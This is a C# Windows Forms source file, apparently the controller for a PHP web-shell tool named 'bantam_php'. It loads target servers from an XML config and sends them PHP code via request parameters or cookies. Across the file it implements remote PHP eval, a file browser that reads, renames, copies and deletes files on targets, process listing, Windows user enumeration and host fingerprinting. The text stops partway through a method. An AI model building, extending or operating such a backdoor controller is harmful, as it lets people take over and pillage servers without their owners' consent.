using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Xml;

namespace bantam_php
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public const string CONFIG_FILE = "bantam.xml";

        /// <summary>
        /// 
        /// </summary>
        public String g_SelectedTarget;

        /// <summary>
        /// 
        /// </summary>
        public Dictionary<String, HostInfo> Clients = new Dictionary<String, HostInfo>();

        /// <summary>
        /// Main Form Constructor, performs the initialization routine, and requests some basic information about every server provided
        /// through the XML, then puts them into the gui
        /// </summary>
        public BantamMain()
        {
            InitializeComponent();
            loadhostTargetsFromXML();
        }

        /// <summary>
        /// 
        /// </summary>
        public void loadhostTargetsFromXML(string xmlFile = CONFIG_FILE)
        {
            //check if config file exists, proceed to load it and select the "servers" into an XmlNodeList
            if (File.Exists(xmlFile))
            {
                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(xmlFile);

                XmlNodeList itemNodes = xmlDoc.SelectNodes("//servers/server");

                if (itemNodes.Count > 0)
                {
                    //loop through every server
                    foreach (XmlNode itemNode in itemNodes)
                    {
                        //TODO abstract this into process function(s)
                        //Hot select target onload up
                        string hostTarget = (itemNode.Attributes?["host"] != null) ? itemNode.Attributes?["host"].Value : "";
                        string requestArg = (itemNode.Attributes?["request_arg"] != null) ? itemNode.Attributes?["request_arg"].Value : "";
                        string requestMethod = (itemNode.Attributes?["request_method"] != null) ? itemNode.Attributes?["request_method"].Value : "";

                        //invalid hostTarget/target name
                        if (string.IsNullOrEmpty(hostTarget))
                        {
                            continue;
                        }
                        //add the hostTarget to our client class containing infos
                        Clients.Add(hostTarget, new HostInfo());

                        //if the request arg is specified in the XML and not set to command
                        if (string.IsNullOrEmpty(requestArg) == false
                        && requestArg != "command")
                        {
                            Clients[hostTarget].RequestArgName = requestArg;
                        }

                        //if the request method is specified in the XML and set to cookie
                        if (string.IsNullOrEmpty(requestMethod) == false
                         && requestMethod == "cookie")
                        {
                            Clients[hostTarget].SendDataViaCookie = true;
                        }

                        //execute ping on current hostTarget iteration
                        Thread t = new Thread(() => getInitDataThread(hostTarget));
                        t.Start();
                    }
                }
            } else {
                MessageBox.Show("Config file (" + CONFIG_FILE + ") is missing.", "Oh... Shied..");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool validTarget()
        {
            if (string.IsNullOrEmpty(g_SelectedTarget) == false)
            {
                if (Clients[g_SelectedTarget].Down == false)
                {
                    return true;
                }
            }
            return false;
        }

        //These are called/invoked when a thread needs to modify a UI element that exists in the main thread.
        #region THREAD_SAFE_DELEGATE_CALLBACKS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        /// <param name="pingMS"></param>
        public delegate void addClientDelegate(string hostTarget, string pingMS);
        public void addClientMethod(string hostTarget, string pingMS)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new addClientDelegate(addClientMethod), new object[] { hostTarget, pingMS });
                return;
            }

            //add them to our listview
            //TODO either do not add them to the listview or add them add red with a NA ping, and the ability to re-ping (fix) them
            if (pingMS == "-")
            {
                listViewClients.Items.Add(new ListViewItem(new string[] { hostTarget, pingMS }));

                int lastIndex = listViewClients.Items.Count - 1;
                listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Clients[hostTarget].Down = true;
            } else {
                listViewClients.Items.Add(new ListViewItem(new string[] { hostTarget, pingMS + " ms" }));
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void guiCallbackUpdateListViewItemDelegate(object arg = null);
        public void guiCallbackUpdateListViewItemPing(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackUpdateListViewItemDelegate(guiCallbackUpdateListViewItemPing), arg);
                return;
            }

            object[] objects = (object[])arg;
            ListViewItem lvi = (ListViewItem)objects[0];
            string hostTarget = (string)objects[1];

            lvi.SubItems[1].Text = Clients[hostTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
            Clients[hostTarget].PingStopwatch.Stop();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void guiCallbackBrowserViewDelegate(object arg = null);
        public void guiCallbackBrowserViewMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackBrowserViewDelegate(guiCallbackBrowserViewMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    BrowserView broView = new BrowserView(result, 1000, 1000);
                    broView.Show();
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserWindowsStartDelegate(object arg = null);
        public void fileBrowserWindowsStartMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserWindowsStartDelegate(fileBrowserWindowsStartMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] drives = { null };
                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives)
                        {
                            treeViewFileBrowser.Nodes.Add("", drive, 3);
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserLinuxStartDelegate(object arg = null);
        public void fileBrowserLinuxStartMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserLinuxStartDelegate(fileBrowserLinuxStartMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] rows = result.Split(new string[] { PHP.rowSeperator }, StringSplitOptions.None);

                    if (rows.Length > 0 && rows != null)
                    {
                        foreach (string row in rows)
                        {
                            string[] columns = row.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);

                            if (columns != null && columns.Length - 2 > 0)
                            {
                                if (columns[columns.Length - 2] == "dir")
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                        TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                } else {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                        TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserBtnGoClickDelegate(object arg = null);
        public void fileBrowserBtnGoClickMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserBtnGoClickDelegate(fileBrowserBtnGoClickMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                string result = (string)objects[1];

                if (string.IsNullOrEmpty(hostTarget) == false)
                {
                    //Clear preview treeview data
                    Clients[hostTarget].Files.Nodes.Clear();

                    //if user didn't switch targets by the time this callback is triggered clear the live treeview
                    if (g_SelectedTarget == hostTarget)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        treeViewFileBrowser.Refresh();
                    }

                    //set path
                    string path = txtBoxFileBrowserPath?.Text;
                    if (string.IsNullOrEmpty(path))
                    {
                        path = ".";
                    }

                    if (result != null && result.Length > 0)
                    {
                        string[] rows = result.Split(new string[] { PHP.rowSeperator }, StringSplitOptions.None);

                        if (rows.Length > 0 && rows != null)
                        {
                            foreach (string row in rows)
                            {
                                string[] columns = row.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);

                                if (columns != null && columns.Length - 2 > 0)
                                {
                                    if (columns[columns.Length - 2] == "dir")
                                    {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (g_SelectedTarget == hostTarget)
                                        {
                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        } else {
                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                            TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                    } else {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (g_SelectedTarget == hostTarget)
                                        {
                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        } else {
                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                            TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="arg"></param>
        public delegate void fileBrowserMouseClickDelegate(object arg = null);
        public void fileBrowserMouseClickMethod(object arg = null)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new fileBrowserMouseClickDelegate(fileBrowserMouseClickMethod), arg);
                return;
            }

            if (arg != null)
            {
                object[] objects = (object[])arg;
                string hostTarget = (string)objects[0];
                TreeNode tn = (TreeNode)objects[1];
                string result = (string)objects[2];

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] rows = result.Split(new string[] { PHP.rowSeperator }, StringSplitOptions.None);

                    if (rows.Length > 0 && rows != null)
                    {
                        foreach (string row in rows)
                        {
                            string[] columns = row.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);

                            if (columns != null && columns.Length - 2 > 0)
                            {
                                if (columns[columns.Length - 2] == "dir")
                                {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //TODO update their client cache here user changed clients
                                    }
                                } else {
                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
                                    if (hostTarget == g_SelectedTarget)
                                    {
                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                        if (string.IsNullOrEmpty(columns[2]) == false)
                                        {
                                            lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                        }
                                    } else {
                                        //TODO update their client cache here user changed clients
                                    }
                                }
                            } else {
                                //MessageBox.Show(columns[0]);
                            }
                        }
                        tn.Expand();
                    }
                }
            }
        }

        #endregion

        #region REQUEST_THREADS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="Code"></param>
        /// <param name="Callback"></param>
        /// <param name="CallbackArgs"></param>
        private void startPhpExecutionThread(string phpCode, Action<object> callback = null, object[] callbackArgs = null)
        {
            string hostTarget = g_SelectedTarget;

            Thread t = new Thread(dynamicRequestThread);
            t.Start(new DynamicThreadArgs(hostTarget, phpCode, callback, callbackArgs));
        }

        /// <summary>
        /// Starts a thread that executes the php code
        /// </summary>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        public void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
        {
            if (validTarget() == false)
            {
                return;
            }

            string hostTarget = g_SelectedTarget;
            var t = new Thread(() => richTextboxDialogThread(hostTarget, phpCode, title));
            t.Start();
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        public void richTextboxDialogThread(string hostTarget, string phpCode, string title)
        {
            string resultTxt = executePHP(hostTarget, phpCode);

            if (string.IsNullOrEmpty(resultTxt) == false)
            {
                CustomForms.RichTextBoxDialog(title, resultTxt);
            } else {
                //TODO if (cfg messageboxes)
                MessageBox.Show("No Data Returned", "Welp...");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        public void getInitDataThread(string hostTarget)
        {
            if (string.IsNullOrEmpty(hostTarget.ToString()) == false)
            {
                //start stopwatch for ping/estimated average response time
                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                string result = executePHP(hostTarget, PHP.initDataVars);

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] data = { null };
                    data = result.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);

                    var initDataReturnedVarCount = Enum.GetValues(typeof(PHP.INIT_DATA_VARS)).Cast<PHP.INIT_DATA_VARS>().Max();

                    if (data != null && data.Length == (int)initDataReturnedVarCount + 1)
                    {
                        //invokes a thread safe call from the GUI thread so we can safely update the GUI's listview
                        addClientMethod(hostTarget, pingWatch.ElapsedMilliseconds.ToString());

                        //add clients info to our local data handler
                        Clients[hostTarget].update(pingWatch.ElapsedMilliseconds, data);
                    } else {
                        addClientMethod(hostTarget, "-");
                    }
                } else {
                    addClientMethod(hostTarget, "-");
                }
                pingWatch.Stop();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="args"></param>
        public void dynamicRequestThread(object args)
        {
            if (args != null)
            {
                //cast the args to our defined class
                DynamicThreadArgs wrapperArgs = (DynamicThreadArgs)args;

                //execute our request in our threads that runs asynchronously along side the GUI thread
                string result = executePHP(wrapperArgs.host, wrapperArgs.code);

                if (string.IsNullOrEmpty(result) == false)
                {
                    if (wrapperArgs.callbackArgs != null && wrapperArgs.callbackArgs.Length > 0)
                    {
                        //TODO: make the following 3 lines suck less or not exist
                        //appends the result of the php execution into the callback args for the callback function
                        object[] tmpCallbackArgs = wrapperArgs.callbackArgs;
                        Array.Resize(ref tmpCallbackArgs, wrapperArgs.callbackArgs.Length + 1);
                        tmpCallbackArgs[wrapperArgs.callbackArgs.Length] = result;

                        //Invoke the dynamic thread safe callback, with it's "object" of arguments
                        wrapperArgs.callback?.Invoke(tmpCallbackArgs);
                    } else {
                        wrapperArgs.callback?.Invoke(null);
                    }
                }
            }
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// Displays and copies your local IPV4 address
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void getMyIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //todo use php >.>
            string remoteIP = this.makeRequest("http://ipv4.icanhazip.com/", "");

            if (string.IsNullOrEmpty(remoteIP) == false)
            {
                MessageBox.Show(remoteIP, "Your IP is : ");
                Clipboard.SetText(remoteIP);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            bool showResponse = false;
            string code = CustomForms.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedTarget, "", ref showResponse);

            if (string.IsNullOrEmpty(code) == false)
            {
                if(showResponse)
                {
                    //execute the code and show it in a richtextbox
                    executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedTarget);
                } else {
                    startPhpExecutionThread(code);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            ListViewItem lvi = GUI_Helper.GetFirstSelectedListview(listViewClients);

            if (lvi != null
            && (Clients[g_SelectedTarget].PingStopwatch == null 
            || Clients[g_SelectedTarget].PingStopwatch.IsRunning == false))
            {
                //start client stopwatch
                Clients[g_SelectedTarget].PingStopwatch = new Stopwatch();
                Clients[g_SelectedTarget].PingStopwatch.Start();

                object[] callbackArgs = { lvi, g_SelectedTarget };
                startPhpExecutionThread(PHP.phpTestExecutionWithEcho, guiCallbackUpdateListViewItemPing, callbackArgs);
            }
        }

        //TODO low priority make the redtube a editable link
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void unameaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            //todo wtf is going on here with the browser view method, unametoolstrip click.. and no callback..
            startPhpExecutionThread(PHP.getBasicCurl("http://youtube.com/"), guiCallbackBrowserViewMethod);
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            startPhpExecutionThread(PHP.phpInfo, guiCallbackBrowserViewMethod);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabPageFiles_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GUI_Helper.GetFirstSelectedListview(listViewClients);
            if (lvi != null)
            {
                //copy a backup of the current file tree view into clients
                if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
                {
                    //Clear previously cached treeview to only store 1 copy
                    if (!string.IsNullOrEmpty(g_SelectedTarget)
                    && Clients[g_SelectedTarget].Files.Nodes.Count > 0)
                    {
                        Clients[g_SelectedTarget].Files.Nodes.Clear();
                    }
                    //store current treeview into client and clear
                    GUI_Helper.CopyNodes(treeViewFileBrowser, Clients[g_SelectedTarget].Files);
                    treeViewFileBrowser.Nodes.Clear();
                }

                g_SelectedTarget = lvi.SubItems[0].Text;

                //TODO: investigate - new possible issue
                if (validTarget() == false)
                {
                    //clear the ui of invalid data
                    lblDynCWD.Text = "";
                    lblDynFreeSpace.Text = "";
                    lblDynHDDSpace.Text = "";
                    lblDynServerIP.Text = "";
                    lblDynUname.Text = "";
                    lblDynUser.Text = "";
                    lblDynWebServer.Text = "";
                    lblDynGroup.Text = "";
                    lblDynPHP.Text = "";
                    txtBoxFileBrowserPath.Text = "";
                    return;
                }

                lblDynCWD.Text = Clients[g_SelectedTarget].CWD;
                lblDynFreeSpace.Text = string.IsNullOrEmpty(Clients[g_SelectedTarget].FreeHDDSpace) ? "0" 
                                     : GUI_Helper.FormatBytes(Convert.ToDouble(Clients[g_SelectedTarget].FreeHDDSpace));

                lblDynHDDSpace.Text = string.IsNullOrEmpty(Clients[g_SelectedTarget].TotalHDDSpace) ? "0" 
                                    : GUI_Helper.FormatBytes(Convert.ToDouble(Clients[g_SelectedTarget].TotalHDDSpace));

                lblDynServerIP.Text = Clients[g_SelectedTarget].IP;
                lblDynUname.Text = Clients[g_SelectedTarget].UnameRelease + " " + Clients[g_SelectedTarget].UnameKernel;
                lblDynUser.Text = Clients[g_SelectedTarget].UID + " ( " + Clients[g_SelectedTarget].User + " )";
                lblDynWebServer.Text = Clients[g_SelectedTarget].ServerSoftware;
                lblDynGroup.Text = Clients[g_SelectedTarget].GID + " ( " + Clients[g_SelectedTarget].Group + " )";
                lblDynPHP.Text = Clients[g_SelectedTarget].PHP_Version;

                if (tabControl1.SelectedTab == tabPageFiles)
                {
                    if (Clients[g_SelectedTarget].Files.Nodes != null
                    && Clients[g_SelectedTarget].Files.Nodes.Count > 0)
                    {
                        GUI_Helper.CopyNodes(Clients[g_SelectedTarget].Files, treeViewFileBrowser);
                        treeViewFileBrowser.Refresh();
                        treeViewFileBrowser.ExpandAll();
                    } else {
                        start_FileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (tabControl1.SelectedTab == tabPageFiles)
            {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes.Count == 0 
                && Clients[g_SelectedTarget].Files.Nodes != null
                && Clients[g_SelectedTarget].Files.Nodes.Count > 0)
                {
                    //populate the treeview from cache
                    GUI_Helper.CopyNodes(Clients[g_SelectedTarget].Files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0)
                    {
                        start_FileBrowser();
                    }
                }
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private void start_FileBrowser()
        {
            if (validTarget() == false)
            {
                return;
            }

            txtBoxFileBrowserPath.Text = Clients[g_SelectedTarget].CWD;

            if (Clients[g_SelectedTarget].isWindows)
            {
                startPhpExecutionThread(PHP.getHardDriveLetters, fileBrowserWindowsStartMethod);
            } else {
                string directoryContentsPHPCode = PHP.getDirectoryEnumerationCode(".", Clients[g_SelectedTarget].PHP_Version);
                startPhpExecutionThread(directoryContentsPHPCode, fileBrowserLinuxStartMethod);
            }

            if (tabControl1.SelectedTab != tabPageFiles)
            {
                tabControl1.SelectedTab = tabPageFiles;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            start_FileBrowser();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0)
            {
                //replace backslash from the treenode path to a proper forward slash
                string path = tn.FullPath.Replace('\\', '/');
                //Get Directory Contents PHP code
                string directoryContentsPHPCode = PHP.getDirectoryEnumerationCode(path, Clients[g_SelectedTarget].PHP_Version);

                //attempts to execute the directoryContents PHP code on the "target"

                //setup GUI callback to call after request
                //setup main thread
                object[] callbackParams = { g_SelectedTarget, tn };
                
                startPhpExecutionThread(directoryContentsPHPCode, fileBrowserMouseClickMethod, callbackParams);
            }
        }

        //TODO Cleanup later, find another way to do this or disable the flashing

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (treeViewFileBrowser.Nodes != null 
             && treeViewFileBrowser.Nodes.Count > 0)
            {
                Clients[g_SelectedTarget].Files.Nodes.Clear();
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            start_FileBrowser();
        }


        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null)
            {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            string phpCode = "@readfile('" + path + "');";

            executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + path);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            string path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
            string newFileName = CustomForms.RenameFileDialog(fileName, "Renaming File");

            if (newFileName != "")
            {
                //todo abstract
                string newFile = path + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                startPhpExecutionThread(phpCode);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", "HOLD ON THERE COWBOY", MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes)
            {
                //todo abstract
                string code = "@unlink('" + path + "');";

                startPhpExecutionThread(code);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string path;
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');

            if (treeViewFileBrowser.SelectedNode.Parent != null)
            {
                path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
            } else {
                path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            }

            string newFileName = CustomForms.RenameFileDialog(fileName, "Copying File");

            if (newFileName != "")
            {
                string newFile = path + '/' + newFileName;
                string code = "@copy('" + fileName + "', '" + newFile + "');";

                startPhpExecutionThread(code);
            }
        }

        /// <summary>
        /// Change filebrowser directory and refresh the view
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnFilesBrowserGo_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
            {
                return;
            }

            string directoryContentsPHPCode = PHP.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Clients[g_SelectedTarget].PHP_Version);

            //todo fix the need of selected target being passed??...
            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod);
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            bool isWin = Clients[g_SelectedTarget].isWindows;
            string phpCode = PHP.executeSystemCode(PHP.getTaskListFunction(isWin));
            executePHPCodeDisplayInRichTextBox(phpCode, "Process List");
        }

        //Triggered via MENU_ITEM_CLICK

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isWindows)
            {
                string phpCode = PHP.executeSystemCode(PHP.windowsOS_NetUser);
                executePHPCodeDisplayInRichTextBox(phpCode, "User Account");
            } else {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
